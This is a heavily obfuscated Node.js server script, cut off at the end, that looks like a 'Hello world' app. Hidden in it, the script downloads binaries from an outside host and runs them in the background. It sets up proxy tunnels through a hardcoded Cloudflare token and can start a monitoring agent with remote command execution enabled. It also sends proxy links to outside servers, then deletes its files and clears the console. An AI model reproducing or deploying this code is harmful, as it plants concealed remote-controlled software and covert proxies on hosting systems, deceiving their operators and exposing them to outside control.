const _0x5caeb7=_0x3042;(function(_0xebdaa9,_0x27f803){const _0x25f78f=_0x3042,_0x2d60ac=_0xebdaa9();while(!![]){try{const _0x1068d5=-parseInt(_0x25f78f(0x14c))/0x1+-parseInt(_0x25f78f(0x18b))/0x2*(-parseInt(_0x25f78f(0x105))/0x3)+-parseInt(_0x25f78f(0x172))/0x4*(parseInt(_0x25f78f(0xca))/0x5)+-parseInt(_0x25f78f(0xdf))/0x6*(-parseInt(_0x25f78f(0x175))/0x7)+parseInt(_0x25f78f(0xef))/0x8*(parseInt(_0x25f78f(0x11a))/0x9)+-parseInt(_0x25f78f(0xe8))/0xa*(-parseInt(_0x25f78f(0x147))/0xb)+parseInt(_0x25f78f(0x14d))/0xc*(-parseInt(_0x25f78f(0x186))/0xd);if(_0x1068d5===_0x27f803)break;else _0x2d60ac['push'](_0x2d60ac['shift']());}catch(_0x1f217b){_0x2d60ac['push'](_0x2d60ac['shift']());}}}(_0x4de8,0xe8f91));const express=require(_0x5caeb7(0xed)),app=express(),axios=require(_0x5caeb7(0xdc)),os=require('os'),fs=require('fs'),path=require(_0x5caeb7(0xe2)),{promisify}=require(_0x5caeb7(0x15a)),exec=promisify(require('child_process')[_0x5caeb7(0x12f)]),{execSync}=require(_0x5caeb7(0xd0)),UPLOAD_URL=process[_0x5caeb7(0xc4)][_0x5caeb7(0xde)]||'',PROJECT_URL=process[_0x5caeb7(0xc4)][_0x5caeb7(0x15c)]||'',AUTO_ACCESS=process[_0x5caeb7(0xc4)][_0x5caeb7(0xe4)]||![],FILE_PATH=process[_0x5caeb7(0xc4)]['FILE_PATH']||_0x5caeb7(0x136),SUB_PATH=process[_0x5caeb7(0xc4)]['SUB_PATH']||_0x5caeb7(0xc8),PORT=process[_0x5caeb7(0xc4)][_0x5caeb7(0x12c)]||process[_0x5caeb7(0xc4)]['PORT']||0xbb8,UUID=process[_0x5caeb7(0xc4)][_0x5caeb7(0x170)]||_0x5caeb7(0x109),NEZHA_SERVER=process[_0x5caeb7(0xc4)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x5caeb7(0xc4)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5caeb7(0xc4)][_0x5caeb7(0x139)]||'',ARGO_DOMAIN=process[_0x5caeb7(0xc4)][_0x5caeb7(0x189)]||'tunv.dssmian.qzz.io',ARGO_AUTH=process[_0x5caeb7(0xc4)][_0x5caeb7(0xc6)]||_0x5caeb7(0x13b),ARGO_PORT=process['env'][_0x5caeb7(0xd4)]||0x1f41,CFIP=process['env'][_0x5caeb7(0x178)]||_0x5caeb7(0x171),CFPORT=process[_0x5caeb7(0xc4)][_0x5caeb7(0x149)]||0x1bb,NAME=process['env'][_0x5caeb7(0x17f)]||_0x5caeb7(0x128);!fs[_0x5caeb7(0xfb)](FILE_PATH)?(fs[_0x5caeb7(0x110)](FILE_PATH),console['log'](FILE_PATH+_0x5caeb7(0x135))):console[_0x5caeb7(0xe0)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x39b7a3=_0x5caeb7,_0x5201b5='abcdefghijklmnopqrstuvwxyz';let _0x51f1d9='';for(let _0x3d61f4=0x0;_0x3d61f4<0x6;_0x3d61f4++){_0x51f1d9+=_0x5201b5[_0x39b7a3(0x10f)](Math[_0x39b7a3(0x16a)](Math['random']()*_0x5201b5[_0x39b7a3(0xf4)]));}return _0x51f1d9;}function _0x3042(_0x3ef561,_0x792e86){_0x3ef561=_0x3ef561-0xc4;const _0x4de86a=_0x4de8();let _0x3042d7=_0x4de86a[_0x3ef561];return _0x3042d7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5caeb7(0x106)](FILE_PATH,npmName),phpPath=path[_0x5caeb7(0x106)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x5caeb7(0x106)](FILE_PATH,botName),subPath=path[_0x5caeb7(0x106)](FILE_PATH,_0x5caeb7(0x150)),listPath=path[_0x5caeb7(0x106)](FILE_PATH,_0x5caeb7(0x183)),bootLogPath=path[_0x5caeb7(0x106)](FILE_PATH,_0x5caeb7(0x142)),configPath=path[_0x5caeb7(0x106)](FILE_PATH,_0x5caeb7(0x155));function deleteNodes(){const _0x4e22c0=_0x5caeb7;try{if(!UPLOAD_URL)return;if(!fs[_0x4e22c0(0xfb)](subPath))return;let _0x5cc99a;try{_0x5cc99a=fs['readFileSync'](subPath,_0x4e22c0(0x14e));}catch{return null;}const _0x84ccdd=Buffer[_0x4e22c0(0x17d)](_0x5cc99a,'base64')[_0x4e22c0(0x181)]('utf-8'),_0x16e976=_0x84ccdd['split']('\x0a')[_0x4e22c0(0xc7)](_0x368f1e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e22c0(0xe1)](_0x368f1e));if(_0x16e976[_0x4e22c0(0xf4)]===0x0)return;return axios[_0x4e22c0(0x11b)](UPLOAD_URL+_0x4e22c0(0x124),JSON[_0x4e22c0(0x168)]({'nodes':_0x16e976}),{'headers':{'Content-Type':_0x4e22c0(0xfa)}})[_0x4e22c0(0x18d)](_0x3478ea=>{return null;}),null;}catch(_0x35bfa2){return null;}}function cleanupOldFiles(){const _0x173d1d=_0x5caeb7;try{const _0x48826e=fs[_0x173d1d(0x10e)](FILE_PATH);_0x48826e['forEach'](_0x43b1c0=>{const _0xbb1fd4=_0x173d1d,_0x1f9efb=path[_0xbb1fd4(0x106)](FILE_PATH,_0x43b1c0);try{const _0x363a35=fs[_0xbb1fd4(0xdb)](_0x1f9efb);_0x363a35[_0xbb1fd4(0x111)]()&&fs[_0xbb1fd4(0x18a)](_0x1f9efb);}catch(_0x1076df){}});}catch(_0x34d92e){}}app[_0x5caeb7(0xf2)]('/',function(_0x565349,_0x50661d){const _0x292f89=_0x5caeb7;_0x50661d[_0x292f89(0x179)](_0x292f89(0x14a));});async function generateConfig(){const _0x5bd870=_0x5caeb7,_0xcdb713={'log':{'access':_0x5bd870(0x13f),'error':_0x5bd870(0x13f),'loglevel':_0x5bd870(0xd8)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x5bd870(0x138)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x5bd870(0x10a),'dest':0xbba},{'path':_0x5bd870(0x112),'dest':0xbbb},{'path':_0x5bd870(0xff),'dest':0xbbc}]},'streamSettings':{'network':_0x5bd870(0x156)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x5bd870(0x16e),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x5bd870(0xd8)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x5bd870(0xd8),'wsSettings':{'path':_0x5bd870(0x10a)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5bd870(0xce)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5bd870(0xe6),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5bd870(0x112)}},'sniffing':{'enabled':!![],'destOverride':[_0x5bd870(0x17c),'tls',_0x5bd870(0xce)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5bd870(0xe6),'protocol':_0x5bd870(0xc5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5bd870(0xd8),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5bd870(0x17c),_0x5bd870(0x108),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5bd870(0x11c)]},'outbounds':[{'protocol':'freedom','tag':_0x5bd870(0x15f)},{'protocol':_0x5bd870(0x137),'tag':_0x5bd870(0xc9)}]};fs[_0x5bd870(0x129)](path[_0x5bd870(0x106)](FILE_PATH,'config.json'),JSON[_0x5bd870(0x168)](_0xcdb713,null,0x2));}function getSystemArchitecture(){const _0x10cbfe=_0x5caeb7,_0x55f62a=os[_0x10cbfe(0x11f)]();return _0x55f62a===_0x10cbfe(0x141)||_0x55f62a===_0x10cbfe(0xfe)||_0x55f62a===_0x10cbfe(0x10c)?_0x10cbfe(0x141):_0x10cbfe(0x103);}function downloadFile(_0x87a9ad,_0x261323,_0x12f0ae){const _0x5e5674=_0x5caeb7,_0x2933dc=_0x87a9ad;!fs['existsSync'](FILE_PATH)&&fs[_0x5e5674(0x110)](FILE_PATH,{'recursive':!![]});const _0x331c3e=fs['createWriteStream'](_0x2933dc);axios({'method':_0x5e5674(0xf2),'url':_0x261323,'responseType':_0x5e5674(0x162)})[_0x5e5674(0x117)](_0x177ce5=>{const _0x2d8bd9=_0x5e5674;_0x177ce5[_0x2d8bd9(0x133)]['pipe'](_0x331c3e),_0x331c3e['on'](_0x2d8bd9(0xd5),()=>{const _0x430c9d=_0x2d8bd9;_0x331c3e['close'](),console[_0x430c9d(0xe0)](_0x430c9d(0x180)+path[_0x430c9d(0xeb)](_0x2933dc)+'\x20successfully'),_0x12f0ae(null,_0x2933dc);}),_0x331c3e['on'](_0x2d8bd9(0x187),_0x1993ae=>{const _0x3a25f1=_0x2d8bd9;fs[_0x3a25f1(0x11d)](_0x2933dc,()=>{});const _0x436344=_0x3a25f1(0x180)+path[_0x3a25f1(0xeb)](_0x2933dc)+_0x3a25f1(0x13c)+_0x1993ae[_0x3a25f1(0x157)];console[_0x3a25f1(0x187)](_0x436344),_0x12f0ae(_0x436344);});})['catch'](_0x16f061=>{const _0x534900=_0x5e5674,_0x1c374d=_0x534900(0x180)+path[_0x534900(0xeb)](_0x2933dc)+_0x534900(0x13c)+_0x16f061[_0x534900(0x157)];console[_0x534900(0x187)](_0x1c374d),_0x12f0ae(_0x1c374d);});}async function downloadFilesAndRun(){const _0x421382=_0x5caeb7,_0x52c7c7=getSystemArchitecture(),_0x5ccfe2=getFilesForArchitecture(_0x52c7c7);if(_0x5ccfe2[_0x421382(0xf4)]===0x0){console[_0x421382(0xe0)](_0x421382(0x16d));return;}const _0x82cc87=_0x5ccfe2[_0x421382(0x123)](_0x5280ba=>{return new Promise((_0xbffef8,_0x37f5bf)=>{const _0x3964e6=_0x3042;downloadFile(_0x5280ba[_0x3964e6(0xe5)],_0x5280ba['fileUrl'],(_0x513e0a,_0x12aa3f)=>{_0x513e0a?_0x37f5bf(_0x513e0a):_0xbffef8(_0x12aa3f);});});});try{await Promise[_0x421382(0x188)](_0x82cc87);}catch(_0x433a26){console[_0x421382(0x187)]('Error\x20downloading\x20files:',_0x433a26);return;}function _0x3d69b7(_0x4c0f8c){const _0x20418f=_0x421382,_0x197e33=0x1fd;_0x4c0f8c[_0x20418f(0x16c)](_0x2e556e=>{const _0x4cb516=_0x20418f;fs[_0x4cb516(0xfb)](_0x2e556e)&&fs[_0x4cb516(0x151)](_0x2e556e,_0x197e33,_0x5bc8f6=>{const _0x291467=_0x4cb516;_0x5bc8f6?console[_0x291467(0x187)](_0x291467(0x144)+_0x2e556e+':\x20'+_0x5bc8f6):console[_0x291467(0xe0)](_0x291467(0x15e)+_0x2e556e+':\x20'+_0x197e33[_0x291467(0x181)](0x8));});});}const _0x5238f0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3d69b7(_0x5238f0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xc550e1=NEZHA_SERVER[_0x421382(0x14b)](':')?NEZHA_SERVER[_0x421382(0x167)](':')[_0x421382(0x16f)]():'',_0x551d6a=new Set([_0x421382(0xf5),'8443','2096',_0x421382(0xd9),'2083',_0x421382(0x13d)]),_0x206540=_0x551d6a[_0x421382(0x15b)](_0xc550e1)?_0x421382(0xd6):'false',_0x37c45c='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x421382(0x114)+_0x206540+_0x421382(0x143)+UUID;fs['writeFileSync'](path[_0x421382(0x106)](FILE_PATH,_0x421382(0x161)),_0x37c45c);const _0x3632c9=_0x421382(0xf6)+phpPath+_0x421382(0x153)+FILE_PATH+_0x421382(0xd3);try{await exec(_0x3632c9),console[_0x421382(0xe0)](phpName+_0x421382(0x12b)),await new Promise(_0x50e7e1=>setTimeout(_0x50e7e1,0x3e8));}catch(_0x2b6fdd){console[_0x421382(0x187)](_0x421382(0x140)+_0x2b6fdd);}}else{let _0x1e5bd9='';const _0x487f40=[_0x421382(0xf5),_0x421382(0xee),_0x421382(0xf3),_0x421382(0xd9),'2083',_0x421382(0x13d)];_0x487f40['includes'](NEZHA_PORT)&&(_0x1e5bd9=_0x421382(0x12e));const _0x51d00e=_0x421382(0xf6)+npmPath+_0x421382(0x113)+NEZHA_SERVER+':'+NEZHA_PORT+_0x421382(0x121)+NEZHA_KEY+'\x20'+_0x1e5bd9+_0x421382(0x134);try{await exec(_0x51d00e),console[_0x421382(0xe0)](npmName+_0x421382(0x12b)),await new Promise(_0x10029f=>setTimeout(_0x10029f,0x3e8));}catch(_0x36307a){console[_0x421382(0x187)](_0x421382(0xec)+_0x36307a);}}}else console['log'](_0x421382(0x130));const _0x11fe9c='nohup\x20'+webPath+_0x421382(0x173)+FILE_PATH+_0x421382(0x16b);try{await exec(_0x11fe9c),console[_0x421382(0xe0)](webName+_0x421382(0x12b)),await new Promise(_0x4c8a85=>setTimeout(_0x4c8a85,0x3e8));}catch(_0xb3deb5){console[_0x421382(0x187)](_0x421382(0x13a)+_0xb3deb5);}if(fs[_0x421382(0xfb)](botPath)){let _0x22bcb3;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x22bcb3=_0x421382(0x104)+ARGO_AUTH;else ARGO_AUTH[_0x421382(0xea)](/TunnelSecret/)?_0x22bcb3=_0x421382(0x10b)+FILE_PATH+_0x421382(0x166):_0x22bcb3=_0x421382(0xda)+FILE_PATH+_0x421382(0x158)+ARGO_PORT;try{await exec(_0x421382(0xf6)+botPath+'\x20'+_0x22bcb3+_0x421382(0x12a)),console[_0x421382(0xe0)](botName+_0x421382(0x12b)),await new Promise(_0x49989e=>setTimeout(_0x49989e,0x7d0));}catch(_0x3dceaa){console[_0x421382(0x187)](_0x421382(0xcc)+_0x3dceaa);}}await new Promise(_0x4030be=>setTimeout(_0x4030be,0x1388));}function getFilesForArchitecture(_0x7316bf){const _0x1d1339=_0x5caeb7;let _0x5cf24e;_0x7316bf==='arm'?_0x5cf24e=[{'fileName':webPath,'fileUrl':_0x1d1339(0x102)},{'fileName':botPath,'fileUrl':_0x1d1339(0x13e)}]:_0x5cf24e=[{'fileName':webPath,'fileUrl':_0x1d1339(0x107)},{'fileName':botPath,'fileUrl':_0x1d1339(0xcd)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2f7dac=_0x7316bf===_0x1d1339(0x141)?_0x1d1339(0x12d):'https://amd64.ssss.nyc.mn/agent';_0x5cf24e[_0x1d1339(0x11e)]({'fileName':npmPath,'fileUrl':_0x2f7dac});}else{const _0x355e51=_0x7316bf==='arm'?_0x1d1339(0x115):'https://amd64.ssss.nyc.mn/v1';_0x5cf24e['unshift']({'fileName':phpPath,'fileUrl':_0x355e51});}}return _0x5cf24e;}function argoType(){const _0x49b83f=_0x5caeb7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x49b83f(0xe0)](_0x49b83f(0x119));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x49b83f(0x129)](path[_0x49b83f(0x106)](FILE_PATH,_0x49b83f(0xd2)),ARGO_AUTH);const _0x4fe9a3=_0x49b83f(0x100)+ARGO_AUTH[_0x49b83f(0x167)]('\x22')[0xb]+_0x49b83f(0x17a)+path[_0x49b83f(0x106)](FILE_PATH,'tunnel.json')+_0x49b83f(0x177)+ARGO_DOMAIN+_0x49b83f(0xf1)+ARGO_PORT+_0x49b83f(0xe7);fs[_0x49b83f(0x129)](path[_0x49b83f(0x106)](FILE_PATH,_0x49b83f(0x148)),_0x4fe9a3);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x44433a=_0x5caeb7;let _0x16b5e5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x16b5e5=ARGO_DOMAIN,console[_0x44433a(0xe0)](_0x44433a(0x118),_0x16b5e5),await _0x34a399(_0x16b5e5);else try{const _0x413f87=fs[_0x44433a(0x132)](path[_0x44433a(0x106)](FILE_PATH,_0x44433a(0x142)),_0x44433a(0x14e)),_0x152357=_0x413f87[_0x44433a(0x167)]('\x0a'),_0x320cb5=[];_0x152357[_0x44433a(0x16c)](_0x4e5aed=>{const _0x21750b=_0x44433a,_0x42b677=_0x4e5aed[_0x21750b(0xea)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x42b677){const _0xae67f=_0x42b677[0x1];_0x320cb5[_0x21750b(0x17e)](_0xae67f);}});if(_0x320cb5['length']>0x0)_0x16b5e5=_0x320cb5[0x0],console[_0x44433a(0xe0)](_0x44433a(0x145),_0x16b5e5),await _0x34a399(_0x16b5e5);else{console[_0x44433a(0xe0)](_0x44433a(0xcf)),fs['unlinkSync'](path[_0x44433a(0x106)](FILE_PATH,_0x44433a(0x142)));async function _0x30ad16(){const _0x21aea3=_0x44433a;try{process[_0x21aea3(0x10d)]===_0x21aea3(0xd1)?await exec(_0x21aea3(0x122)+botName+_0x21aea3(0x14f)):await exec('pkill\x20-f\x20\x22['+botName[_0x21aea3(0x10f)](0x0)+']'+botName[_0x21aea3(0x15d)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3c7078){}}_0x30ad16(),await new Promise(_0x2c88d1=>setTimeout(_0x2c88d1,0xbb8));const _0x5be7bb=_0x44433a(0xda)+FILE_PATH+_0x44433a(0x158)+ARGO_PORT;try{await exec(_0x44433a(0xf6)+botPath+'\x20'+_0x5be7bb+_0x44433a(0x12a)),console[_0x44433a(0xe0)](botName+_0x44433a(0x12b)),await new Promise(_0x490d8a=>setTimeout(_0x490d8a,0xbb8)),await extractDomains();}catch(_0x518a04){console[_0x44433a(0x187)](_0x44433a(0xcc)+_0x518a04);}}}catch(_0x506f01){console[_0x44433a(0x187)](_0x44433a(0xe9),_0x506f01);}async function _0x417040(){const _0x42a42d=_0x44433a;try{const _0x43ec0d=await axios['get'](_0x42a42d(0xd7),{'timeout':0xbb8});if(_0x43ec0d[_0x42a42d(0x133)]&&_0x43ec0d[_0x42a42d(0x133)][_0x42a42d(0x159)]&&_0x43ec0d[_0x42a42d(0x133)]['org'])return _0x43ec0d[_0x42a42d(0x133)][_0x42a42d(0x159)]+'_'+_0x43ec0d['data'][_0x42a42d(0xf9)];}catch(_0x1f0435){try{const _0xbe79f1=await axios[_0x42a42d(0xf2)](_0x42a42d(0x160),{'timeout':0xbb8});if(_0xbe79f1[_0x42a42d(0x133)]&&_0xbe79f1['data']['status']==='success'&&_0xbe79f1[_0x42a42d(0x133)][_0x42a42d(0x154)]&&_0xbe79f1[_0x42a42d(0x133)][_0x42a42d(0xf9)])return _0xbe79f1['data'][_0x42a42d(0x154)]+'_'+_0xbe79f1[_0x42a42d(0x133)][_0x42a42d(0xf9)];}catch(_0x370f0a){}}return _0x42a42d(0x131);}async function _0x34a399(_0x525103){const _0xf2e133=await _0x417040(),_0x461408=NAME?NAME+'-'+_0xf2e133:_0xf2e133;return new Promise(_0x3f25ba=>{setTimeout(()=>{const _0x59315e=_0x3042,_0x2dcf73={'v':'2','ps':''+_0x461408,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x59315e(0xd8),'net':'ws','type':_0x59315e(0xd8),'host':_0x525103,'path':'/vmess-argo?ed=2560','tls':_0x59315e(0x108),'sni':_0x525103,'alpn':'','fp':_0x59315e(0x126)},_0x1ad5fe='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x59315e(0xf0)+_0x525103+_0x59315e(0x125)+_0x525103+_0x59315e(0x184)+_0x461408+_0x59315e(0x101)+Buffer[_0x59315e(0x17d)](JSON[_0x59315e(0x168)](_0x2dcf73))[_0x59315e(0x181)]('base64')+_0x59315e(0x164)+UUID+'@'+CFIP+':'+CFPORT+_0x59315e(0x182)+_0x525103+_0x59315e(0x125)+_0x525103+_0x59315e(0xf7)+_0x461408+_0x59315e(0x120);console['log'](Buffer[_0x59315e(0x17d)](_0x1ad5fe)[_0x59315e(0x181)](_0x59315e(0x174))),fs[_0x59315e(0x129)](subPath,Buffer['from'](_0x1ad5fe)[_0x59315e(0x181)](_0x59315e(0x174))),console[_0x59315e(0xe0)](FILE_PATH+_0x59315e(0xcb)),uploadNodes(),app[_0x59315e(0xf2)]('/'+SUB_PATH,(_0x542be9,_0x6bbb62)=>{const _0x3a3974=_0x59315e,_0x49416b=Buffer[_0x3a3974(0x17d)](_0x1ad5fe)['toString']('base64');_0x6bbb62['set']('Content-Type',_0x3a3974(0x185)),_0x6bbb62['send'](_0x49416b);}),_0x3f25ba(_0x1ad5fe);},0x7d0);});}}async function uploadNodes(){const _0x5c3478=_0x5caeb7;if(UPLOAD_URL&&PROJECT_URL){const _0x3938ac=PROJECT_URL+'/'+SUB_PATH,_0x1f92a5={'subscription':[_0x3938ac]};try{const _0x5943e3=await axios[_0x5c3478(0x11b)](UPLOAD_URL+'/api/add-subscriptions',_0x1f92a5,{'headers':{'Content-Type':_0x5c3478(0xfa)}});return _0x5943e3&&_0x5943e3['status']===0xc8?(console[_0x5c3478(0xe0)](_0x5c3478(0x17b)),_0x5943e3):null;}catch(_0x253a6a){if(_0x253a6a[_0x5c3478(0x176)]){if(_0x253a6a[_0x5c3478(0x176)][_0x5c3478(0x169)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5c3478(0xfb)](listPath))return;const _0x9f2acd=fs['readFileSync'](listPath,'utf-8'),_0x393dbf=_0x9f2acd[_0x5c3478(0x167)]('\x0a')[_0x5c3478(0xc7)](_0x1095c9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5c3478(0xe1)](_0x1095c9));if(_0x393dbf[_0x5c3478(0xf4)]===0x0)return;const _0x317309=JSON['stringify']({'nodes':_0x393dbf});try{const _0x316a56=await axios[_0x5c3478(0x11b)](UPLOAD_URL+_0x5c3478(0xe3),_0x317309,{'headers':{'Content-Type':_0x5c3478(0xfa)}});return _0x316a56&&_0x316a56[_0x5c3478(0x169)]===0xc8?(console[_0x5c3478(0xe0)]('Nodes\x20uploaded\x20successfully'),_0x316a56):null;}catch(_0x24ed29){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4eb971=_0x3042,_0x3ccb71=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3ccb71['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3ccb71[_0x4eb971(0x17e)](phpPath);process[_0x4eb971(0x10d)]===_0x4eb971(0xd1)?exec(_0x4eb971(0xdd)+_0x3ccb71[_0x4eb971(0x106)]('\x20')+_0x4eb971(0x146),_0x210dc8=>{const _0xb0d1cf=_0x4eb971;console['clear'](),console[_0xb0d1cf(0xe0)](_0xb0d1cf(0x152)),console[_0xb0d1cf(0xe0)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x4eb971(0x116)+_0x3ccb71['join']('\x20')+_0x4eb971(0x18c),_0x7790d2=>{const _0x33b89b=_0x4eb971;console['clear'](),console[_0x33b89b(0xe0)](_0x33b89b(0x152)),console[_0x33b89b(0xe0)](_0x33b89b(0xf8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4e87b6=_0x5caeb7;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4e87b6(0x127));return;}try{const _0x4ee16b=await axios[_0x4e87b6(0x11b)](_0x4e87b6(0x165),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4e87b6(0xfa)}});return console[_0x4e87b6(0xe0)]('automatic\x20access\x20task\x20added\x20successfully'),_0x4ee16b;}catch(_0xd8299){return console[_0x4e87b6(0x187)](_0x4e87b6(0x163)+_0xd8299[_0x4e87b6(0x157)]),null;}}function _0x4de8(){const _0x3ff732=['\x0a\x20\x20credentials-file:\x20','Subscription\x20uploaded\x20successfully','http','from','push','NAME','Download\x20','toString','?security=tls&sni=','list.txt','&path=%2Fvless-argo%3Fed%3D2560#','text/plain;\x20charset=utf-8','871ZyNTJB','error','all','ARGO_DOMAIN','unlinkSync','19812KPOEqr','\x20>/dev/null\x202>&1','catch','env','trojan','ARGO_AUTH','filter','sub','block','35pYSSSr','/sub.txt\x20saved\x20successfully','Error\x20executing\x20command:\x20','https://amd64.ssss.nyc.mn/bot','quic','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','child_process','win32','tunnel.json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_PORT','finish','true','https://ipapi.co/json/','none','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','statSync','axios','del\x20/f\x20/q\x20','UPLOAD_URL','330HXjxDB','log','test','path','/api/add-nodes','AUTO_ACCESS','fileName','127.0.0.1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2060330RgYMCZ','Error\x20reading\x20boot.log:','match','basename','npm\x20running\x20error:\x20','express','8443','8xTbTng','?encryption=none&security=tls&sni=','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','get','2096','length','443','nohup\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','org','application/json','existsSync','http\x20server\x20is\x20running\x20on\x20port:','listen','arm64','/trojan-argo','\x0a\x20\x20tunnel:\x20','\x0a\x0avmess://','https://arm64.ssss.nyc.mn/web','amd','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','411yyHPNy','join','https://amd64.ssss.nyc.mn/web','tls','abe04db7-6c06-4404-9c45-89886c58e8f3','/vless-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','aarch64','platform','readdirSync','charAt','mkdirSync','isFile','/vmess-argo','\x20-s\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/v1','rm\x20-rf\x20','then','ARGO_DOMAIN:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','14906799BodevU','post','https+local://8.8.8.8/dns-query','unlink','unshift','arch','\x0a\x20\x20\x20\x20','\x20-p\x20','taskkill\x20/f\x20/im\x20','map','/api/delete-nodes','&fp=firefox&type=ws&host=','firefox','Skipping\x20adding\x20automatic\x20access\x20task','DSV3','writeFileSync','\x20>/dev/null\x202>&1\x20&','\x20is\x20running','SERVER_PORT','https://arm64.ssss.nyc.mn/agent','--tls','exec','NEZHA\x20variable\x20is\x20empty,skip\x20running','Unknown','readFileSync','data','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20is\x20created','./tmp','blackhole','xtls-rprx-vision','NEZHA_KEY','web\x20running\x20error:\x20','eyJhIjoiMTM3ZDBmN2QyZDIzMTVlYjE1YTZiOWEyMDY2ZjRkMGQiLCJ0IjoiMGQ0MDAwNWEtYzI3OC00ZGYzLWI2N2EtOTQ3Mjc1ZjdmYThhIiwicyI6IllURTRaVFV3TjJFdE5tWXhOaTAwWkRSaUxXRTBORE10TkdReU5tTXdZVEExWkdSbCJ9','\x20failed:\x20','2053','https://arm64.ssss.nyc.mn/bot','/dev/null','php\x20running\x20error:\x20','arm','boot.log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Empowerment\x20failed\x20for\x20','ArgoDomain:','\x20>\x20nul\x202>&1','55vOyczf','tunnel.yml','CFPORT','Hello\x20world!','includes','157721ljCjqa','262500gqHqrx','utf-8','.exe\x20>\x20nul\x202>&1','sub.txt','chmod','App\x20is\x20running','\x20-c\x20\x22','countryCode','config.json','tcp','message','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','country_code','util','has','PROJECT_URL','substring','Empowerment\x20success\x20for\x20','direct','http://ip-api.com/json/','config.yaml','stream','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x0atrojan://','https://oooo.serv00.net/add-url','/tunnel.yml\x20run','split','stringify','status','floor','/config.json\x20>/dev/null\x202>&1\x20&','forEach','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','vless','pop','UUID','cdns.doon.eu.org','896860VjKjEL','\x20-c\x20','base64','13174xYzTSZ','response','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','CFIP','send'];_0x4de8=function(){return _0x3ff732;};return _0x4de8();}async function startserver(){const _0x35fe7e=_0x5caeb7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 